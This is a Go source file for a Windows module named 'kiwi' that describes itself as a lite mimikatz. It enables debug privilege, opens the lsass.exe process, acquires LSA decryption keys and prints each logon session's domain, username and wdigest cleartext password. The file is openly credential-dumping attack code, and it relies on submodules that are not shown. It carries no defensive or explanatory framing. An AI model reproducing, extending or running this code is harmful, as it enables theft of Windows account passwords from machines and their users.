// +build windows

package kiwi

import (
	"context"
	"fmt"
	"runtime"
	"sync"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// ErrKiwiClosed is an error about closed.
var ErrKiwiClosed = fmt.Errorf("kiwi module is closed")

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	debug bool       // is get debug privilege
	wow64 uint8      // 0 = not read, 1 = true, 2 = false
	mu    sync.Mutex // lock above fields

	// version about windows
	major uint32
	minor uint32
	build uint32
	verMu sync.Mutex

	lsass   *lsass
	session *session
	lsaNT5  *lsaNT5
	lsaNT6  *lsaNT6
	wdigest *wdigest

	// prevent dead loop
	context context.Context
	cancel  context.CancelFunc
}

// NewKiwi is used to create a new kiwi module.
func NewKiwi(lg logger.Logger) (*Kiwi, error) {
	switch arch := runtime.GOARCH; arch {
	case "386", "amd64":
	default:
		return nil, errors.Errorf("architecture %s is not supported", arch)
	}
	kiwi := &Kiwi{
		logger: lg,
		rand:   random.NewRand(),
	}
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		kiwi.logf(logger.Warning, "running kiwi (x86) in the x64 Windows")
	}
	major, minor, build := kiwi.getWindowsVersion()
	switch major {
	case 5:
		kiwi.lsaNT5 = newLSA5(kiwi)
	case 6, 10:
		kiwi.lsaNT6 = newLSA6(kiwi)
	default:
		return nil, errors.Errorf("unsupported major NT version: %d", major)
	}
	kiwi.logf(logger.Debug, "major: %d, minor: %d, build: %d", major, minor, build)
	kiwi.lsass = newLsass(kiwi)
	kiwi.session = newSession(kiwi)
	kiwi.wdigest = newWdigest(kiwi)
	kiwi.context, kiwi.cancel = context.WithCancel(context.Background())
	return kiwi, nil
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	pHandle, err := kiwi.lsass.OpenProcess()
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	err = kiwi.acquireLSAKeys(pHandle)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to acquire LSA keys")
	}
	sessions, err := kiwi.session.GetLogonSessionList(pHandle)
	if err != nil {
		return nil, err
	}
	for _, session := range sessions {
		fmt.Println()
		fmt.Println("Domain:", session.Domain)
		fmt.Println("Username:", session.Username)
		fmt.Println("Logon server:", session.LogonServer)
		fmt.Println("SID:", session.SID)
		cred, err := kiwi.wdigest.GetPassword(pHandle, session.LogonID)
		if err != nil {
			return nil, err
		}
		if cred == nil {
			continue
		}
		fmt.Println("  wdigest:")
		fmt.Println("    *Domain:", cred.Domain)
		fmt.Println("    *Username:", cred.Username)
		fmt.Println("    *Password:", cred.Password)
	}
	return nil, nil
}

// acquireLSAKeys is used to get keys to decrypt credentials.
func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
	if kiwi.lsaNT5 != nil {
		return kiwi.lsaNT5.acquireKeys(pHandle)
	}
	if kiwi.lsaNT6 != nil {
		return kiwi.lsaNT6.acquireKeys(pHandle)
	}
	panic("kiwi: internal error")
}

// Close is used to close kiwi module.
func (kiwi *Kiwi) Close() error {
	kiwi.cancel()
	kiwi.lsass.Close()
	kiwi.session.Close()
	if kiwi.lsaNT5 != nil {
		kiwi.lsaNT5.Close()
	}
	if kiwi.lsaNT6 != nil {
		kiwi.lsaNT6.Close()
	}
	kiwi.wdigest.Close()
	return nil
}
